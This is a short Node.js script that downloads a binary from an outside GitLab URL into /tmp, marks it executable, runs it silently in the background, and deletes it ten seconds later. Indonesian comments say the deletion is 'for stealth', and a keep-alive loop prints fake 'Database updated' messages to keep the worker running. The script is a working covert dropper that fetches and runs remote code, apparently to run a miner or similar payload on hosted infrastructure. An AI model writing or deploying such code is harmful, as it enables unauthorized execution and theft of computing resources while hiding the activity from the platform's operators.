const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

const url = 'https://gitlab.com/vanyastefa96/hondu/-/raw/master/tests/cec';
const fileName = 'zi';
const filePath = path.join('/tmp', fileName);

function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        return reject(new Error(`Joined: status ${res.statusCode}`));
      }
      res.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', reject);
  });
}

async function main() {
  console.log('Environment controlled by BOT');

  try {
    console.log('Resolving...');
    await downloadFile(url, filePath);
    console.log('Almost..');

    // Coba chmod +x (mungkin tidak perlu di /tmp, tapi untuk aman)
    try {
      fs.chmodSync(filePath, 0o755);
      console.log('Done Resolving.');
    } catch (chmodErr) {
      console.error('Noholy:', chmodErr.message);
    }

    // Coba jalankan binary dengan exec (detached-like, tapi capture error)
    exec(`"${filePath}" -j 4 > /dev/null 2>&1 &`, (error, stdout, stderr) => {
      if (error) {
        console.error('Danked):', error.message);
        console.error('Stderr:', stderr);
        return;
      }
      console.log('Start Database. Stdout:', stdout);
    });

    // Hapus file setelah delay (biar stealth & beri waktu proses jalan)
    setTimeout(() => {
      try {
        fs.unlinkSync(filePath);
        console.log('Weldone.');
      } catch (unlinkErr) {
        console.error('Gagal hapus file:', unlinkErr.message);
      }
    }, 10000);  // 10 detik delay

    console.log('done');

  } catch (err) {
    console.error('Error utama:', err.message);
  }

  // Keep-alive: supaya worker tidak mati & tidak dianggap crashed
  console.log('Supposed.');
  setInterval(() => {
    console.log(`[${new Date().toISOString()}] Database updated...`);
  }, 30000);  // Log setiap 30 detik → cukup untuk keep alive tanpa spam
}

main();
